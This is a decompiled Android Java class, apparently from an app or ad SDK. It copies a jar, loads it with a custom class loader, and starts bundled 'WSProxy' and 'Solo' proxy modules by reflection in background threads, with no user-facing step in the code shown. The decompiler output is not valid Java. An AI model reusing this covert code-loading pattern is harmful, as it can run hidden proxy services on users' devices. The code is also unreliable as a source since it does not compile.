package e0;

import android.content.Context;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

/* JADX INFO: compiled from: ProxyUtils.java */
/* JADX INFO: loaded from: classes3.dex */
public class j {
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r0v14 */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v16, types: [java.nio.channels.FileChannel] */
    /* JADX WARN: Type inference failed for: r0v17, types: [java.nio.channels.FileChannel, java.nio.channels.ReadableByteChannel] */
    /* JADX WARN: Type inference failed for: r0v18 */
    /* JADX WARN: Type inference failed for: r0v19 */
    /* JADX WARN: Type inference failed for: r0v2 */
    /* JADX WARN: Type inference failed for: r0v20 */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.nio.channels.FileChannel] */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r1v1 */
    /* JADX WARN: Type inference failed for: r1v10 */
    /* JADX WARN: Type inference failed for: r1v11 */
    /* JADX WARN: Type inference failed for: r1v12, types: [java.nio.channels.FileChannel] */
    /* JADX WARN: Type inference failed for: r1v13 */
    /* JADX WARN: Type inference failed for: r1v14 */
    /* JADX WARN: Type inference failed for: r1v15 */
    /* JADX WARN: Type inference failed for: r1v2 */
    /* JADX WARN: Type inference failed for: r1v3, types: [java.nio.channels.FileChannel] */
    /* JADX WARN: Type inference failed for: r1v9 */
    /* JADX WARN: Type inference failed for: r2v2 */
    /* JADX WARN: Type inference failed for: r2v3 */
    /* JADX WARN: Type inference failed for: r2v4, types: [java.nio.channels.FileChannel] */
    /* JADX WARN: Type inference failed for: r2v5 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:26:0x0051 -> B:61:0x0054). Please report as a decompilation issue!!! */
    public static void a(Context context, String str) throws Throwable {
        boolean z2;
        ?? channel;
        ?? B = n.b.b(context);
        ?? file = new File(n.b.a(context), "NewVersionCopy.jar");
        if (file.exists()) {
            file.delete();
        }
        ?? r2 = 0;
        r2 = 0;
        try {
        } catch (IOException e2) {
            e2.printStackTrace();
            B = e2;
            file = file;
        }
        try {
            try {
                B = new FileInputStream((File) B).getChannel();
            } catch (Exception e3) {
                e = e3;
                B = 0;
                channel = 0;
            } catch (Throwable th) {
                th = th;
                B = 0;
            }
            try {
                channel = new FileOutputStream((File) file).getChannel();
            } catch (Exception e4) {
                e = e4;
                channel = 0;
            } catch (Throwable th2) {
                th = th2;
                try {
                    B.close();
                } catch (IOException e5) {
                    e5.printStackTrace();
                }
                try {
                    r2.close();
                    throw th;
                } catch (IOException e6) {
                    e6.printStackTrace();
                    throw th;
                }
            }
            try {
                channel.transferFrom(B, 0L, B.size());
                B.close();
                B = B;
                file = channel;
            } catch (Exception e7) {
                e = e7;
                e.printStackTrace();
                B.close();
                B = B;
                file = channel;
            }
            try {
                file.close();
            } catch (IOException e8) {
                e8.printStackTrace();
            }
            File fileA = n.b.a(context);
            c1.a aVar = new c1.a(new File(n.b.a(context), "NewVersionCopy.jar").getPath(), fileA.getPath(), fileA.getPath(), context.getClassLoader());
            boolean z3 = true;
            try {
                Class.forName("com.droid.wsproxy.WSProxy");
                i.c(null, "has ws");
                z2 = true;
            } catch (ClassNotFoundException unused) {
                z2 = false;
            }
            if (!z2 && n.a.b()) {
                b(aVar, context, str);
            }
            try {
                Class.forName("com.sntech.sololibrary.Solo");
                i.c(null, "has solo");
            } catch (ClassNotFoundException unused2) {
                z3 = false;
            }
            if (z3 || !n.a.a()) {
                return;
            }
            a(aVar, str);
        } catch (Throwable th3) {
            th = th3;
            r2 = file;
        }
    }

    public static void b(final Context context, final String str) {
        boolean z2;
        boolean z3 = true;
        try {
            Class.forName("com.sntech.sololibrary.Solo");
            i.c(null, "has solo");
            z2 = true;
        } catch (ClassNotFoundException unused) {
            z2 = false;
        }
        if (z2) {
            try {
                Class.forName("com.droid.wsproxy.WSProxy");
                i.c(null, "has ws");
            } catch (ClassNotFoundException unused2) {
                z3 = false;
            }
            if (z3) {
                return;
            }
        }
        new Thread(new Runnable() { // from class: e0.b
            @Override // java.lang.Runnable
            public final void run() throws Throwable {
                j.a(context, str);
            }
        }).start();
    }

    public static void b(final ClassLoader classLoader, final Context context, final String str) {
        new Thread(new Runnable() { // from class: e0.a
            @Override // java.lang.Runnable
            public final void run() {
                j.a(classLoader, context, str);
            }
        }).start();
    }

    public static void a(ClassLoader classLoader, Context context, String str) {
        try {
            i.c(null, "start ws");
            classLoader.loadClass("com.droid.wsproxy.WSProxy").getDeclaredMethod(com.anythink.expressad.foundation.d.c.bT, Context.class, String.class).invoke(null, context, str);
            i.c(null, "start ws finish");
        } catch (Exception e2) {
            i.b(null, "start ws: e = " + e2);
            e2.printStackTrace();
        }
    }

    public static void a(ClassLoader classLoader, String str) {
        try {
            i.c(null, "start solo");
            Class<?> clsLoadClass = classLoader.loadClass("com.sntech.sololibrary.Solo");
            clsLoadClass.getDeclaredMethod(com.anythink.expressad.foundation.d.c.bT, String.class).invoke(clsLoadClass.getDeclaredMethod("getInstance", new Class[0]).invoke(null, new Object[0]), str);
            i.c(null, "start solo finish");
        } catch (Exception e2) {
            i.b(null, "start solo: e = " + e2);
            e2.printStackTrace();
        }
    }
}
